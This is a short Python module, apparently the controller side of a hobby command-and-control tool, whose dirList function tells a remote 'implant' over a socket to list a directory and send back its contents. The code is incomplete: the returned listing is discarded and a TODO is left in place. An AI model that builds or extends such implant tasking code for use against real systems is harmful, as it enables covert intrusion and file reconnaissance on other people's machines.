# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with dir list functionality 

SUCCESS = 1
FAILURE = 0

# Command value
DIR = 3

def dirList(sock, dirPath):
    try:
        # First tell our implant we want a DIR list performed
        print("Sending command...")
        sock.send(bytes(str(DIR), "utf-8") + b'\x00')

        # Send filepath to write to 
        print("Sending dir path...")
        sock.send(dirPath + b'\x00')

        # Wait for response (should be success code)
        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful dirl ist! Getting directory contents...")
            data = sock.recv(1024)
            data = data.strip()
            data = data.decode('utf-8')

            # TODO: handle per file? try to cluster them then add stop code in implant to tell us theres not any more?

        else:
            print("Implant returned FAILURE!")


    except Exception as e:
        print("ERROR: Could not send dir list to implant: ", e)
        return FAILURE

    return SUCCESS
